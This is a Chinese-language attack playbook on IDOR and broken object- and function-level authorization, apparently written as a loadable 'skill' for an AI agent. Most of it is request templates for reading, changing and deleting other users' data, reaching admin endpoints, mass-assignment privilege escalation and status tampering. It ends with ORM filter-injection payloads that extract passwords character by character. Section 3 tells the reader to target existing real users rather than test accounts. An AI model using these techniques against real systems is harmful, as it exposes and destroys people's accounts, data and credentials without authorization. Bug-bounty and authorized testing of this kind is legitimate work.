# 技能：IDOR / 分级权限破坏 — 专家攻击手册

> **AI 加载指令**：IDOR 是漏洞赏金发现的第一大问题。本技能涵盖非显式的 IDOR 暴露面、所有攻击向量（不仅限于 URL 参数）、A-B 测试方法、BOLA 与 BFLA 的区别、将 IDOR 链接到更高影响，以及测试人员反复忽略的内容。

---

## 1. IDOR 与 BOLA 与 BFLA

| 术语 | 含义 | 影响 |
|---|---|---|
| IDOR | 不安全的直接对象引用 | 读取/修改其他用户的数据 |
| BOLA | 分级权限破坏（OWASP API Top 10 A1） | 与 IDOR 相同，API 术语 |
| BFLA | 函数级权限破坏 | 低权限用户访问高权限功能（例如，管理员端点） |

**关键区别**： 
- BOLA = 访问你不应该拥有的**对象**（属于其他用户的数据）
- BFLA = 访问你不应该被授权的**功能**（管理员 CRUD 操作、批量操作、用户管理）

---

## 2. 哪里可以找到对象 ID（所有位置）

不要只停留在 URL 路径参数 — ID 出现在：

```
URL 路径：        GET /api/v1/users/1234/profile
URL 查询：       GET /orders?order_id=982
请求体：         {"userId": 1234, "action": "view"}
JSON 字段：     {"resource": {"id": 5678, "type": "invoice"}}
请求头：         X-User-ID: 1234
                 X-Account-ID: 9999
Cookie：         user_id=1234; account=org_5678
GraphQL 参数：   query { user(id: "1234") { ... } }
表单字段：     <input name="documentId" value="5678">
WebSocket 消息：  {"event":"subscribe","channel_id":9999}
```

---

## 3. A-B 测试方法

最系统的 IDOR 测试方法：

```
步骤 1：创建两个测试账户：UserA 和 UserB
步骤 2：以 UserA 的身份执行所有操作，捕获所有请求
        （个人资料编辑、订单查看、密码更改、文件访问等）
步骤 3：记录 UserA 创建或访问的每个对象 ID
步骤 4：以 UserB 的身份进行身份验证
步骤 5：使用 UserB 的会话令牌重放 UserA 的请求
步骤 6：如果 UserB 可以读取/修改 UserA 的数据 → BOLA 确认

受害者重要：对于真实漏洞，请针对现有用户，而不是测试账户。
报告证据：显示 UserA 拥有资源，UserB 访问了它。
```

---

## 4. ID 类型及其影响

| ID 模式 | 示例 | 备注 |
|---|---|---|
| 顺序整数 | `id=1001` → `id=1002` | 容易预测，高命中率 |
| UUID v4 | `550e8400-...` | 需要从其他端点找到 UUID |
| UUID v1 | 基于时间的 UUID | 时间可预测！提取时间戳/MAC |
| 来自自身数据的 GUID | 查看响应中 | 首先从你自己的账户数据中收集所有 UUID |
| 哈希 ID | `md5(user_id)` | 尝试哈希顺序整数 |
| 编码 ID | base64(`{"id":1001}`) | 解码 → 修改 → 重新编码 |
| 复合 ID | `/api/users/1/orders/5` | 两个 ID 都可能独立验证 |

---

## 5. 水平与垂直权限提升

**水平**：UserA 访问 UserB 的数据（相同权限级别）
```
GET /api/account/1234/statement     ← 你是用户 5678
```

**垂直**：低权限用户访问仅管理员可用的功能
```
POST /api/admin/users/delete        ← 普通用户调用管理员端点
GET /api/admin/all-users
PUT /api/users/1234/role {"role":"admin"}
```

**组合**：低权限 IDOR 授予权限提升
```
GET /api/v1/users/1/details → 读取管理员用户的认证令牌
```

---

## 6. HTTP 方法提升

当 `GET /resource/1234` 被适当限制时，测试所有其他动词：

```http
GET    /api/v1/users/UserA_ID    ← 可能被阻止
POST   /api/v1/users/UserA_ID    ← 不同的代码路径，可能不检查授权
PUT    /api/v1/users/UserA_ID    ← 更新其他用户的数据
DELETE /api/v1/users/UserA_ID    ← 删除其他用户的账户
PATCH  /api/v1/users/UserA_ID    ← 部分更新（通常在授权检查中遗漏）
```

**为什么这有效**：授权逻辑通常按方法实现，开发者会忘记边缘情况。

---

## 7. 参数污染与类型混淆

当 `id=1234` 被验证时，尝试：
```
id[]=1234&id[]=5678          ← 数组 — 应用程序可能使用第一个或最后一个
id=5678&id=1234              ← 重复 — 应用程序可能优先使用第一个或最后一个
{"id": "1234"}               ← 字符串 vs 整数：可能命中不同的代码路径
{"id": [1234]}               ← JSON 中的数组
{"userId": 1234, "id": 5678} ← 两个 ID 字段 — 哪个用于授权？
```

**JSON 类型混淆**：
```json
{"userId": "1234"}   vs   {"userId": 1234}
```
一些 ORM 在查询中处理字符串 vs 整数的方式不同。

---

## 8. BFLA（函数级）攻击

### 常见 BFLA 端点测试

```http
# 用户管理（设计为仅管理员访问）：
GET /api/v1/admin/users
DELETE /api/v1/users/{any_user_id}
PUT /api/v1/users/{user_id}/role

# 批量操作：
POST /api/v1/users/bulk-delete
GET /api/v1/export/all-data

# 订阅/支付管理：
POST /api/v1/admin/subscription/modify
GET /api/v1/admin/payments/all

# 内部报告：
GET /api/v1/reports/all-users-activity
```

### 如何找到隐藏的管理员端点
1. 读取 JS 打包文件 — 管理员路由通常在前端代码中暴露
2. 查看API文档（Swagger/OpenAPI）中的“admin”、“内部”、“特权”标签
3. 枚举 `/api/v1/admin/**`，`/api/v1/manage/**`，`/api/v1/internal/**`
4. Burp “发现内容”在 API 基路径上
5. 如果可用，比较普通用户文档与管理员部分文档

---

## 9. 间接 IDOR（引用链）

应用程序在对象 A 上检查权限，但不在引用对象 B 上检查所有权：

**示例**：
```
UserA 有权限读取自己的消息。
GET /api/messages/1234 → 检查： "用户是否拥有消息 1234?" ✓

但：消息有附件。
GET /api/attachments/5678 → 不检查： "附件是否属于用户拥有的消息?"
```

测试：直接通过其 ID 访问附件/子资源，而不通过父端点。

**GraphQL 变体**：通过关系直接查询相关对象而不进行单独的授权：
```graphql
query {
  myProfile {
    followers {
      privateEmail    ← 通过关系访问其他用户的私有字段
    }
  }
}
```

---

## 10. 批量赋值 → 权限提升

当 POST/PUT 接收 JSON 正文时，底层模型中的属性可能可设置，即使不在官方 API 文档中：

```json
POST /api/v1/register
{
  "username": "attacker",
  "email": "a@evil.com",
  "password": "password",
  "role": "admin",          ← 隐藏字段
  "isAdmin": true,          ← 隐藏字段
  "verified": true,         ← 跳过电子邮件验证
  "creditBalance": 9999     ← 给自己积分
}
```

**如何找到隐藏字段**：
1. 拦截管理员“创建用户”与普通“注册”的差异 — 对比字段
2. 查看API文档中所有可能的字段
3. 如果可用，检查源代码（GitHub、JS 打包文件）
4. Burp 模糊：添加常见属性名称并检查 `200` vs `400`

---

## 11. 状态机滥用（业务逻辑 IDOR）

当资源有状态/状态时：
```
order.status: pending → confirmed → shipped → delivered
```

测试：能否跳过状态？
```
PUT /api/orders/1234 {"status": "delivered"}  ← 从 "pending"
PUT /api/orders/1234 {"status": "refunded"}   ← 从 "pending"（跳过 shipped）
```

能否设置另一个用户的订单状态？
```
PUT /api/orders/UserA_order_id {"status": "cancelled"}  ← 以 UserB 的身份
```

---

## 12. 快速 IDOR 检查清单

```
□ 创建 2 个账户（UserA + UserB）
□ 映射所有包含对象 ID 的 API 调用（Burp 历史记录导出过滤器）
□ 测试每个端点的所有 HTTP 动词
□ 在所有位置测试 ID：路径、正文、头、查询、Cookie
□ 尝试顺序 ID（−1, +1 从你自己的）
□ 尝试从你自己的账户数据中收集的 UUIDs/GUIDs
□ 测试子资源（附件、评论、交易）
□ 直接测试管理员端点（BFLA）
□ 测试 POST/PUT 正文中的额外字段（批量赋值）
□ 比较JSON响应字段数量与文档化字段（隐藏字段）
□ 测试状态/状态字段修改
```

---

## 13. 系统性 IDOR 测试 — 8 类别

| # | 类别 | 测试方法 |
|---|---|---|
| 1 | 直接 ID 引用 | 在 URL 中更改数字/UUID ID：`/api/users/123` → `/api/users/124` |
| 2 | 可预测的 UUID | 如果 UUID 是 v1（基于时间），相邻 ID 是可计算的 |
| 3 | 批量/批量操作 | `/api/users/bulk?ids=123,456` — 添加其他用户的 ID |
| 4 | 导出/下载 | 导出端点泄露其他用户的数据：`/export?user_id=*` |
| 5 | 链接对象 IDOR | 将 `order.address_id` 更改为另一个用户的地址 |
| 6 | 资源替换 | 使用另一个用户的资源 ID 更新自己的个人资料 → 覆盖 |
| 7 | 写入 IDOR | PUT/PATCH/DELETE 使用其他用户的 ID — 修改/删除他们的数据 |
| 8 | 嵌套对象 | `/api/orgs/1/users/2` — 更改 org ID 访问其他 org 的用户 |

### 测试流程

```
1. 创建两个测试账户（A 和 B）
2. 以 A 的身份执行所有 CRUD 操作，捕获所有请求 ID
3. 重放每个请求，将 A 的 ID 替换为 B 的 ID
4. 检查：A 能否读取 B 的数据？修改？删除？
5. 测试：数字 ID、UUID、缩写、编码值
6. 测试：URL 路径、查询参数、JSON 正文、头
```

---

## 14. ORM 过滤链泄露

### Django ORM 过滤注入

```python
# 易受攻击：User.objects.filter(**request.data)
# 攻击者发送：{"password__startswith": "a"}
# Django 转换为：WHERE password LIKE 'a%'

# 字符逐个提取：
POST /api/users/
{"username": "admin", "password__startswith": "a"}   → 200 (匹配)
{"username": "admin", "password__startswith": "b"}   → 404 (不匹配)
# 遍历字符集以每个位置
```

### Prisma 过滤注入

```json
// 易受攻击：prisma.user.findMany({ where: req.body })
// 攻击者发送嵌套 include/select：
{
  "include": {
    "posts": {
      "include": {
        "author": {
          "select": {"password": true}
        }
      }
    }
  }
}
// 通过关系遍历泄露密码字段
```

### Ransack（Ruby on Rails）

```
# Ransack 允许通过查询参数进行搜索谓词：
GET /users?q[password_cont]=admin
# 搜索：WHERE password LIKE '%admin%'

# 字符提取：
GET /users?q[password_start]=a   → 计数结果
GET /users?q[password_start]=ab  → 缩小范围
# 工具：plormber（自动化的 Ransack 提取）
```
